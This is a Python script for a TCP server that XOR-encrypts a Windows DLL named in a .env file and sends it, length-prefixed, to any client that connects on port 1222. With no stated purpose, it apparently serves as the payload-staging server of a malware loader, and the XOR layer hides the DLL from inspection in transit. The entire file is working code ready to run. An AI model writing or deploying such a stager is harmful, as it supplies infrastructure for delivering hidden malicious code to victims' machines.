#!/usr/bin/env python3

import socket
import struct
import sys
import signal
import threading
import logging
import os
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("dllserver")

shutdown_event = threading.Event()


def load_env():
    env_path = Path(__file__).parent / ".env"
    if not env_path.exists():
        log.error(".env file not found in server directory")
        sys.exit(1)

    with open(env_path, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, value = line.split("=", 1)
            os.environ[key.strip()] = value.strip()


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def load_and_encrypt(dll_path: Path, key: bytes) -> bytes:
    raw = dll_path.read_bytes()
    if len(raw) < 64:
        raise ValueError(f"File too small to be a valid PE ({len(raw)} bytes)")
    if raw[:2] != b"MZ":
        log.warning("File does not start with MZ header")
    return xor_encrypt(raw, key)


def handle_client(client: socket.socket, addr: tuple, dll_path: Path, key: bytes):
    try:
        encrypted = load_and_encrypt(dll_path, key)
        size_header = struct.pack("<I", len(encrypted))
        client.sendall(size_header)
        client.sendall(encrypted)
        log.info(f"  -> Sent {len(encrypted)} bytes to {addr[0]}:{addr[1]}")
    except FileNotFoundError:
        log.error(f"  -> DLL file not found: {dll_path}")
    except ValueError as e:
        log.error(f"  -> {e}")
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        log.warning(f"  -> Client {addr[0]}:{addr[1]} disconnected: {e}")
    finally:
        client.close()


def main():
    load_env()

    dll_path_str = os.environ.get("DLL_PATH")
    port_str = os.environ.get("PORT", "1222")
    key_str = os.environ.get("XOR_KEY", "123456789ABCDEF0")
    bind_addr = os.environ.get("BIND", "0.0.0.0")

    if not dll_path_str:
        log.error("DLL_PATH not set in .env")
        sys.exit(1)

    dll_path = Path(dll_path_str)
    if not dll_path.is_file():
        log.error(f"DLL file not found: {dll_path}")
        sys.exit(1)

    try:
        port = int(port_str)
        if not 1 <= port <= 65535:
            raise ValueError
    except ValueError:
        log.error(f"Invalid PORT in .env: {port_str}")
        sys.exit(1)

    try:
        key = bytes.fromhex(key_str)
        if len(key) == 0:
            raise ValueError
    except ValueError:
        log.error(f"Invalid XOR_KEY in .env: {key_str}")
        sys.exit(1)

    log.info(f"DLL: {dll_path} ({dll_path.stat().st_size:,} bytes)")
    log.info(f"XOR Key: {key.hex().upper()} ({len(key)} bytes)")
    log.info(f"Listening on {bind_addr}:{port}")
    log.info("Encrypts fresh per connection")
    log.info("Press Ctrl+C to stop\n")

    def sig_handler(sig, frame):
        log.info("\nShutting down...")
        shutdown_event.set()

    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)

    try:
        server.bind((bind_addr, port))
    except OSError as e:
        log.error(f"Bind failed on {bind_addr}:{port} - {e}")
        sys.exit(1)

    server.listen(5)
    client_count = 0

    while not shutdown_event.is_set():
        try:
            client, addr = server.accept()
        except socket.timeout:
            continue
        except OSError:
            break

        client_count += 1
        log.info(f"[#{client_count}] Connection from {addr[0]}:{addr[1]}")
        t = threading.Thread(target=handle_client, args=(client, addr, dll_path, key), daemon=True)
        t.start()

    server.close()
    log.info(f"Server stopped. Served {client_count} client(s).")


if __name__ == "__main__":
    main()
